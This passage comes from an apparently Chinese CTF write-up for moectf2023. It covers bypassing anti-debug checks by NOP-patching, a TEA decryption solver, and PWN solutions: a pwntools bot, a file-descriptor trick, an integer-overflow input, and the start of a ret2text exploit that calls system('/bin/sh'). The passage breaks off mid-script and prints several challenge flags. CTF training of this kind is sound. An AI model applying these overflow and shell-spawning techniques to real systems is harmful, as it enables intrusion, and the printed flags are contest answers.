<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0041589</span>A                 call    j_@__CheckForDebuggerJustMyCode@<span class="number">4</span> ; __CheckForDebuggerJustMyCode(x)</span><br><span class="line">.text:<span class="number">0041589F</span>                 call    sub_4113E3</span><br><span class="line">.text:<span class="number">004158</span>A4                 mov     esi, esp</span><br><span class="line">.text:<span class="number">004158</span>A6                 push    offset Buffer   ; <span class="string">&quot;Welcome to moectf2023!!! Now you find Y&quot;</span>...</span><br></pre></td></tr></table></figure>

<p>运行到4113E3就会闪退，跟进去看一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">004117B</span>7                 push    offset ModuleName ; <span class="string">&quot;Ntdll&quot;</span></span><br><span class="line">.text:<span class="number">004117B</span>C                 call    ds:GetModuleHandleA</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:004117FF                 .text:004117FF                 call    [ebp+var_14]</span><br></pre></td></tr></table></figure>

<p>发现这里面加载了ntdll ，然后在这里call    [ebp+var_14]退出了把这个sub_4113E3 nop掉发现能往下调试了</p>
<p>下面作用类似于scanf 获取输入的函数里面也会闪退</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00411890</span> ; <span class="type">int</span> __cdecl <span class="title function_">sub_411890</span><span class="params">(<span class="type">char</span> *Format, <span class="type">char</span>)</span></span><br><span class="line">.text:00411890 sub_411890      proc near               ; CODE XREF: sub_4113CA↑j</span><br><span class="line">.text:<span class="number">00411890</span></span><br><span class="line">.text:<span class="number">00411890</span> Format          = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">00411890</span> arg_4           = byte ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">00411890</span></span><br><span class="line">.text:<span class="number">00411890</span>                 push    ebp</span><br><span class="line">.text:<span class="number">00411891</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">00411893</span>                 sub     esp, <span class="number">0</span>C0h</span><br><span class="line">.text:<span class="number">00411899</span>                 push    ebx</span><br><span class="line">.text:<span class="number">0041189</span>A                 push    esi</span><br><span class="line">.text:<span class="number">0041189B</span>                 push    edi</span><br><span class="line">.text:<span class="number">0041189</span>C                 mov     edi, ebp</span><br><span class="line">.text:<span class="number">0041189</span>E                 xor     ecx, ecx</span><br><span class="line">.text:<span class="number">004118</span>A0                 mov     eax, <span class="number">0</span>CCCCCCCCh</span><br><span class="line">.text:<span class="number">004118</span>A5                 rep stosd</span><br><span class="line">.text:<span class="number">004118</span>A7                 mov     ecx, offset unk_41C063</span><br><span class="line">.text:<span class="number">004118</span>AC                 call    j_@__CheckForDebuggerJustMyCode@<span class="number">4</span> ; __CheckForDebuggerJustMyCode(x)</span><br><span class="line">.text:<span class="number">004118B</span>1                 call    sub_4113E3</span><br><span class="line">.text:<span class="number">004118B</span>6                 mov     eax, dword ptr [ebp+arg_4]</span><br><span class="line">.text:<span class="number">004118B</span>9                 push    eax             ; <span class="type">char</span></span><br><span class="line">.text:<span class="number">004118B</span>A                 mov     ecx, [ebp+Format]</span><br><span class="line">.text:<span class="number">004118B</span>D                 push    ecx             ; Format</span><br><span class="line">.text:<span class="number">004118B</span>E                 call    sub_4113C5</span><br><span class="line">.text:<span class="number">004118</span>C3                 add     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">004118</span>C6                 pop     edi</span><br><span class="line">.text:<span class="number">004118</span>C7                 pop     esi</span><br><span class="line">.text:<span class="number">004118</span>C8                 pop     ebx</span><br><span class="line">.text:<span class="number">004118</span>C9                 add     esp, <span class="number">0</span>C0h</span><br><span class="line">.text:<span class="number">004118</span>CF                 cmp     ebp, esp</span><br><span class="line">.text:<span class="number">004118</span>D1                 call    j___RTC_CheckEsp</span><br><span class="line">.text:<span class="number">004118</span>D6                 mov     esp, ebp</span><br><span class="line">.text:<span class="number">004118</span>D8                 pop     ebp</span><br><span class="line">.text:<span class="number">004118</span>D9                 retn</span><br><span class="line">.text:<span class="number">004118</span>D9 sub_411890      endp</span><br></pre></td></tr></table></figure>

<p>call    sub_4113E3 这个地方，下面还有个call那个是获取输入的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">004117B</span>7                 push    offset ModuleName ; <span class="string">&quot;Ntdll&quot;</span></span><br><span class="line">.text:<span class="number">004117B</span>C                 call    ds:GetModuleHandleA</span><br><span class="line">    </span><br><span class="line">.text:<span class="number">004117F</span>1                 call    ds:GetCurrentThread</span><br><span class="line">     </span><br><span class="line">.text:<span class="number">004117F</span>F                 call    [ebp+var_14]</span><br></pre></td></tr></table></figure>

<p>这里也加载了ntdll 获取了线程，在call    [ebp+var_14] 这断掉了，nop掉call    sub_4113E3后程序能正常调试了</p>
<p>上面说的坑是，在nop掉这些东西后开始调试程序，他只能从start开始，start里面有一个int3，我看这个也没有什么影响，就给他抛出了，后面到了程序逻辑里面，程序逻辑里面也有个int3，ida自动给我抛出了。一开始start那不抛出int3他就没有什么问题</p>
<p>动态了之后才知道，inputString 后32位 encode了两次，所以第一次写脚本只能解出一半</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    v0, v1 = ciphertext</span><br><span class="line">    k0, k1, k2, k3 = key</span><br><span class="line">    sum_ = <span class="number">0xC6EF3720</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum_) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum_) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        sum_ -= <span class="number">0x9E3779B9</span></span><br><span class="line">        sum_ = sum_ &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> (v0, v1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_to_integers</span>(<span class="params">key_str</span>):</span><br><span class="line">    padded_key = key_str.ljust(<span class="number">16</span>, <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(<span class="built_in">int</span>.from_bytes(padded_key[i:i+<span class="number">4</span>].encode(), <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_key), <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_bytes_to_tuples</span>(<span class="params">data_bytes</span>):</span><br><span class="line">    data_list = [<span class="built_in">int</span>.from_bytes(data_bytes[i:i+<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data_bytes), <span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">zip</span>(data_list[::<span class="number">2</span>], data_list[<span class="number">1</span>::<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tuples_to_bytes</span>(<span class="params">data_tuples</span>):</span><br><span class="line">    byte_list = [item.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> sublist <span class="keyword">in</span> data_tuples <span class="keyword">for</span> item <span class="keyword">in</span> sublist]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(byte_list)</span><br><span class="line"></span><br><span class="line">keys = [<span class="string">&quot;DX3906&quot;</span>, <span class="string">&quot;doctor3&quot;</span>, <span class="string">&quot;FUX1AOYUN&quot;</span>, <span class="string">&quot;R3verier&quot;</span>]</span><br><span class="line">key_integers = [key_to_integers(key) <span class="keyword">for</span> key <span class="keyword">in</span> keys]</span><br><span class="line"></span><br><span class="line">flag1 = [<span class="number">90</span>, <span class="number">227</span>, <span class="number">107</span>, <span class="number">228</span>, <span class="number">6</span>, <span class="number">135</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">67</span>, <span class="number">223</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">119</span>, <span class="number">152</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">143</span>, <span class="number">56</span>, <span class="number">67</span>, <span class="number">153</span>, <span class="number">227</span>, <span class="number">147</span>, <span class="number">34</span>, <span class="number">181</span>, <span class="number">35</span>, <span class="number">253</span>, <span class="number">176</span>, <span class="number">28</span>, <span class="number">229</span>, <span class="number">227</span>, <span class="number">238</span>, <span class="number">206</span>]</span><br><span class="line">flag2 = [<span class="number">47</span>, <span class="number">29</span>, <span class="number">173</span>, <span class="number">43</span>, <span class="number">164</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">216</span>, <span class="number">235</span>, <span class="number">37</span>, <span class="number">250</span>, <span class="number">107</span>, <span class="number">33</span>, <span class="number">183</span>, <span class="number">114</span>, <span class="number">185</span>, <span class="number">3</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">217</span>, <span class="number">76</span>, <span class="number">235</span>, <span class="number">123</span>, <span class="number">245</span>, <span class="number">167</span>, <span class="number">72</span>, <span class="number">249</span>, <span class="number">144</span>, <span class="number">157</span>, <span class="number">56</span>, <span class="number">252</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag1 decode</span></span><br><span class="line">f1 = data_bytes_to_tuples(flag1)</span><br><span class="line">decrypted_data_list_1 = [decrypt(data_tuple, key_integer) <span class="keyword">for</span> data_tuple, key_integer <span class="keyword">in</span> <span class="built_in">zip</span>(f1, key_integers)]</span><br><span class="line">decrypted_bytes_1 = tuples_to_bytes(decrypted_data_list_1)</span><br><span class="line">decrypted_string_1 = decrypted_bytes_1.decode(errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag2 decode1</span></span><br><span class="line">f2 = data_bytes_to_tuples(flag2)</span><br><span class="line">decrypted_data_list_2_1st = [decrypt(data_tuple, key_integer) <span class="keyword">for</span> data_tuple, key_integer <span class="keyword">in</span> <span class="built_in">zip</span>(f2, key_integers)]</span><br><span class="line">decrypted_bytes_2_1st = tuples_to_bytes(decrypted_data_list_2_1st)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag2 decode2</span></span><br><span class="line">f2_2nd = data_bytes_to_tuples(decrypted_bytes_2_1st)</span><br><span class="line">decrypted_data_list_2_2nd = [decrypt(data_tuple, key_integer) <span class="keyword">for</span> data_tuple, key_integer <span class="keyword">in</span> <span class="built_in">zip</span>(f2_2nd, key_integers)]</span><br><span class="line">decrypted_bytes_2_2nd = tuples_to_bytes(decrypted_data_list_2_2nd)</span><br><span class="line">decrypted_string_2_2nd = decrypted_bytes_2_2nd.decode(errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line"></span><br><span class="line">result = decrypted_string_1 + decrypted_string_2_2nd</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>得到flag moectf{WoOo00Oow_S0_interesting_y0U_C4n_C41l_M3tW1c3_BY_Unw1Nd~}</p>
<p>unwind栈展开的例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdexcept&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    ClassA() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassA constructed.\n&quot;</span>; &#125;</span><br><span class="line">    ~ClassA() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassA destructed.\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    ClassB() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassB constructed.\n&quot;</span>; &#125;</span><br><span class="line">    ~ClassB() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassB destructed.\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassC</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    ClassC() &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassC constructed.\n&quot;</span>;</span><br><span class="line">        throw <span class="built_in">std</span>::runtime_error(<span class="string">&quot;Exception from ClassC constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ~ClassC() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassC destructed.\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        ClassA a;</span><br><span class="line">        ClassB b;</span><br><span class="line">        ClassC c;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (<span class="type">const</span> <span class="built_in">std</span>::exception&amp; e) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Caught exception: &quot;</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="EZNET-未解决-没思路"><a href="#EZNET-未解决-没思路" class="headerlink" title="EZNET[未解决-没思路]"></a>EZNET[未解决-没思路]</h2><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>查看gift提示flag是隐藏的，ls -al 发现.flag cat</p>
<p>moectf{BEgOXB3-Sk6bTQrihNqE5rw4G46OQIHS}</p>
<h2 id="baby-calculator"><a href="#baby-calculator" class="headerlink" title="baby_calculator"></a>baby_calculator</h2><p>后面发现flag出不来，是因为有个换行符，recvline到换行符就停了，用recvrepeat设置个超时时间就读出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern = <span class="string">r&quot;(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*(\d+)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.144.193&#x27;</span>,<span class="number">56098</span>)</span><br><span class="line">p.recvregex(<span class="string">b&#x27;Now..start!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(p.recvline()) ; <span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line">    s = p.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, s)</span><br><span class="line"></span><br><span class="line">    n1, operator, n2, r = <span class="keyword">match</span>.groups()</span><br><span class="line">    n1, n2 , r = <span class="built_in">int</span>(n1) ,<span class="built_in">int</span>(n2) , <span class="built_in">int</span>(r)</span><br><span class="line">    <span class="built_in">print</span>(n1, operator, n2, r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        n1 = n1 + n2</span><br><span class="line">    <span class="keyword">elif</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        n1 = n1 - n2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(r == n1):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;BlackBird\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">b&#x27;WingS\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvrepeat(<span class="number">5</span>))</span><br></pre></td></tr></table></figure>

<p>moectf{H4ve_y0u_rea11y_useD_Pwnt00ls??????}</p>
<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p><a target="_blank" rel="noopener" href="https://wiyi.org/linux-file-descriptor.html">https://wiyi.org/linux-file-descriptor.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/love-jelly-pig/p/10048483.html">https://www.cnblogs.com/love-jelly-pig/p/10048483.html</a></p>
<p>去查询了一下资料，当进程打开一个文件内核会返回一个FILE Descriptor,进程可以通过fd对文件进行操作</p>
<p>这个程序的意思是输入fd,然后通过fd读数据输出，fd 0 1 2都被系统占用了分别是stdin stdout stderr,所以3是flag。</p>
<p>fd被销毁前通过dup2函数将文件描述符复制到了new_fd。new_fd &#x3D; 4 * 3 | 0x29A。new_fd &#x3D;670,所以只需要传入670就能将flag读出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [rsp+4h] [rbp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> new_fd; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">80</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  input = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know fd?&quot;</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;./flag&quot;</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  new_fd = (<span class="number">4</span> * fd) | <span class="number">0x29A</span>;</span><br><span class="line">  dup2(fd, new_fd);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which file do you want to read?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input its fd: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  read(input, flag, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;3H1lDl8GIZHEi0_IWpA4krCAChNI3bpd&#125;</span><br></pre></td></tr></table></figure>



<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/">https://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/</a></p>
<p>int32溢出的原理是进位的时候把最高位的正负符号位改变了，所以变成负数了。</p>
<p>所以要计算变成-114514，要明白 i32的大小范围 2**31 -1。-1是因为有个0</p>
<p>所以只需要计算2**32 - 114514 就能求出溢出到-114514需要输入多少，得到4294852782</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Moectf2023.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know int overflow?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you make n == -114514 but no &#x27;-&#x27; when you input n.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input n:&quot;</span>);</span><br><span class="line">  get_input(&amp;n);</span><br><span class="line">  <span class="keyword">if</span> ( n == <span class="number">-114514</span> )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe you should search and learn it.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;6iD1QTUJSScIKT-_6vm-6nWQs8GvJK6-&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ret2text-32"><a href="#ret2text-32" class="headerlink" title="ret2text_32"></a>ret2text_32</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">84</span>]; <span class="comment">// [esp+10h] [ebp-58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my stack in MoeCTF2023!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your age?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now..try to overflow!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序里面有plt system的，有个&#x2F;bin&#x2F;sh的gadget<br>这里只需要计算buf到返回地址的距离，system填充栈底下的返回地址，然后填充system的返回地址还有&#x2F;bin&#x2F;sh的地址，就能将&#x2F;bin&#x2F;sh传参到system</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">58873</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line = p.recvline() ;<span class="built_in">print</span>(line) <span class="comment"># Welcome 